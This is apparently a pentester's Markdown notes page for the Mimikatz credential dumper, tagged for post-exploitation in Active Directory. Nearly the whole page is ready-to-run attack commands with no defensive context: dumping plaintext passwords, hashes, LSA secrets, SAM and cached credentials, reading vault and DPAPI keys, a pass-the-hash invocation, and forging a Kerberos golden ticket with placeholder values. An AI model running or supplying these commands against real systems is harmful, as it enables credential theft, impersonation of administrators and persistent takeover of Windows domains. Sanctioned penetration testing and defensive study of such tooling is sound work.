---
tags: [tool, activedirectory, credentials]
tool: "mimikatz"
category: "Active Directory"
installed: true
phase: [post-exploit, credential]
---

# Mimikatz - Windows Credential Dumper

## Tool Overview
Purpose: Extract plaintext passwords, hashes, and Kerberos tickets from memory
Location: /usr/share/mimikatz/

## How to Use It

Location:
cd /usr/share/mimikatz/x64/
./mimikatz.exe

Basic Commands:
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
token::elevate
vault::cred
dpapi::masterkey

Dump All:
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
lsadump::sam
lsadump::cache

Pass-the-Hash:
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:cmd.exe

Golden Ticket:
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:ticket.kirbi

## Related Tools
pypykatz, safetykatz
